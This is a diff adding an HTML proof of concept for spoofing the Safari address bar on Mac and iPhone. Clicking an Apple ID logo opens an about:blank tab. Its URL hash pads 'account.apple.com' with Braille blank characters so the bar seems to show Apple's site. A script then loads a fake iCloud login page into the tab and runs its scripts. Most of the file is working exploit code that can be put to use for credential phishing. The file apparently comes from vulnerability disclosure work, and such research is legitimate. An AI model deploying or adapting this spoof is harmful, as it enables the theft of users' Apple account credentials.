@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <script>
+        function poc() {
+//Open new window with about:blank and a hash which contains many whitespaces and in the middle the site address we want to spoof
+
+// Safari Mac Payload
+url='about:blank#\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800account.apple.com\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800';
+
+//iPhone Payload
+if(location.href.includes('ios'))
+url='about:blank#\u2800\u2800\u2800\u2800\u2800\u2800\u2800account.apple.com\u2800\u2800\u2800\u2800\u2800';
+
+v= window.open(url);
+
+// Wait a little and change contents of the newly created tab to a fake login iCloud page as a POC
+setTimeout(()=>{
+fetch('/fakeapple.html').then(r => r.text()).then(h => v.document.body.innerHTML = h).then(() => Array.from(v.document.scripts).forEach(s => v.eval(s.text)));
+},100);
+        }
+    </script>
+   <style>
+body{margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;background-color:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif}
+.container{display:none;text-align:center;padding:20px;background-color:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
+button{background-color:#4285f4;color:white;border:none;padding:12px;font-size:16px;cursor:pointer;transition:background-color 0.3s}
+    </style>
+</head>
+<body>
+
+    <div id="landing" >
+   <img width=300 src=https://docs-assets.developer.apple.com/published/975306cce017e397fdad44f47f8b98c3/apple-id-black-no@2x.png onclick=poc()>
+    </div>
+
+</body>
+</html>
